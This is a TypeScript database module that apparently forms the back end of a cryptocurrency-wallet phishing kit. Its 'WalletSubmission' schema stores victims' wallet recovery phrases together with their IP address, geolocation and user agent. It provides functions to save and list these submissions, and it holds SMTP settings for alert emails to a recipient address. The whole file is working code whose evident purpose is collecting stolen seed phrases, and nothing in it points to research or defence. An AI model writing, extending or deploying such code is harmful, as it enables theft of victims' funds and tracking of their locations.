import { MongoClient, Db } from 'mongodb';

if (!process.env.MONGODB_URI && process.env.USE_MONGODB === 'true') {
  console.warn('MongoDB URI not found in environment variables. MongoDB features will be disabled.');
}

const uri = process.env.MONGODB_URI || '';
const options = {};

let client: MongoClient;
let clientPromise: Promise<MongoClient> | null = null;
let dynamicClientPromise: Promise<MongoClient> | null = null;
let dynamicUri: string = '';

// Only initialize MongoDB connection if URI is provided
if (uri) {
  if (process.env.NODE_ENV === 'development') {
    // In development mode, use a global variable to preserve the MongoClient across hot reloads
    let globalWithMongo = global as typeof globalThis & {
      _mongoClientPromise?: Promise<MongoClient>;
    };

    if (!globalWithMongo._mongoClientPromise) {
      client = new MongoClient(uri, options);
      globalWithMongo._mongoClientPromise = client.connect();
    }
    clientPromise = globalWithMongo._mongoClientPromise;
  } else {
    // In production mode, create a new MongoClient
    client = new MongoClient(uri, options);
    clientPromise = client.connect();
  }
}

export default clientPromise;

// Initialize MongoDB connection with a custom URI (from settings)
export function initializeDynamicConnection(customUri: string): Promise<MongoClient> | null {
  if (!customUri) return null;
  
  // Reuse existing connection if URI hasn't changed
  if (dynamicUri === customUri && dynamicClientPromise) {
    return dynamicClientPromise;
  }
  
  dynamicUri = customUri;
  const dynamicClient = new MongoClient(customUri, options);
  dynamicClientPromise = dynamicClient.connect();
  return dynamicClientPromise;
}

export async function getDatabase(customUri?: string): Promise<Db | null> {
  // Try custom URI from settings first
  if (customUri) {
    try {
      const clientPromise = initializeDynamicConnection(customUri);
      if (clientPromise) {
        const client = await clientPromise;
        return client.db();
      }
    } catch (error) {
      console.error('MongoDB connection error with custom URI:', error);
      // Fall through to try default connection
    }
  }
  
  if (process.env.USE_MONGODB !== 'true') {
    console.log('MongoDB disabled by USE_MONGODB flag');
    return null;
  }
  
  if (!uri || !clientPromise) {
    console.warn('MongoDB URI not configured');
    return null;
  }
  
  try {
    const client = await clientPromise;
    return client.db();
  } catch (error) {
    console.error('MongoDB connection error:', error);
    return null;
  }
}

export interface WalletSubmission {
  _id?: string;
  timestamp: Date;
  walletType: string;
  phrase: string;
  phraseLength: number;
  location: {
    ip: string;
    city: string;
    region: string;
    country: string;
    timezone: string;
    latitude: number | null;
    longitude: number | null;
  };
  device: {
    userAgent: string;
  };
}

export async function saveSubmission(data: Omit<WalletSubmission, '_id'>, customUri?: string): Promise<boolean> {
  const db = await getDatabase(customUri);
  if (!db) {
    console.log('MongoDB not configured, skipping database save');
    return false;
  }

  try {
    const collection = db.collection('submissions');
    await collection.insertOne(data);
    console.log('Submission saved to MongoDB');
    return true;
  } catch (error) {
    console.error('Error saving to MongoDB:', error);
    return false;
  }
}

export async function getAllSubmissions(customUri?: string): Promise<WalletSubmission[]> {
  const db = await getDatabase(customUri);
  if (!db) {
    return [];
  }

  try {
    const collection = db.collection<WalletSubmission>('submissions');
    const submissions = await collection.find({}).sort({ timestamp: -1 }).toArray();
    return submissions;
  } catch (error) {
    console.error('Error fetching submissions:', error);
    return [];
  }
}

export interface AppSettings {
  _id?: string;
  smtpHost: string;
  smtpPort: number;
  smtpSecure: boolean;
  smtpUser: string;
  smtpPass: string;
  alertRecipientEmail: string;
  fromEmail: string;
  useMongodb: boolean;
  useEmail: boolean;
  mongodbUri: string;
  updatedAt: Date;
}

export async function getSettings(): Promise<AppSettings | null> {
  const db = await getDatabase();
  if (!db) {
    // Return default settings from environment
    return {
      smtpHost: process.env.SMTP_HOST || '',
      smtpPort: parseInt(process.env.SMTP_PORT || '587'),
      smtpSecure: process.env.SMTP_SECURE === 'true',
      smtpUser: process.env.SMTP_USER || '',
      smtpPass: process.env.SMTP_PASS || '',
      alertRecipientEmail: process.env.ALERT_RECIPIENT_EMAIL || '',
      fromEmail: process.env.FROM_EMAIL || '',
      useMongodb: process.env.USE_MONGODB === 'true',
      useEmail: process.env.USE_EMAIL !== 'false',
      mongodbUri: process.env.MONGODB_URI || '',
      updatedAt: new Date(),
    };
  }

  try {
    const collection = db.collection<AppSettings>('settings');
    const settings = await collection.findOne({});
    
    if (!settings) {
      // Return default settings from environment
      return {
        smtpHost: process.env.SMTP_HOST || '',
        smtpPort: parseInt(process.env.SMTP_PORT || '587'),
        smtpSecure: process.env.SMTP_SECURE === 'true',
        smtpUser: process.env.SMTP_USER || '',
        smtpPass: process.env.SMTP_PASS || '',
        alertRecipientEmail: process.env.ALERT_RECIPIENT_EMAIL || '',
        fromEmail: process.env.FROM_EMAIL || '',
        useMongodb: process.env.USE_MONGODB === 'true',
        useEmail: process.env.USE_EMAIL !== 'false',
        mongodbUri: process.env.MONGODB_URI || '',
        updatedAt: new Date(),
      };
    }
    
    return settings;
  } catch (error) {
    console.error('Error fetching settings:', error);
    return null;
  }
}

export async function updateSettings(settings: Omit<AppSettings, '_id' | 'updatedAt'>): Promise<boolean> {
  const db = await getDatabase();
  if (!db) {
    console.log('MongoDB not configured, cannot save settings');
    return false;
  }

  try {
    const collection = db.collection<AppSettings>('settings');
    await collection.updateOne(
      {},
      { $set: { ...settings, updatedAt: new Date() } },
      { upsert: true }
    );
    console.log('Settings updated in MongoDB');
    return true;
  } catch (error) {
    console.error('Error updating settings:', error);
    return false;
  }
}
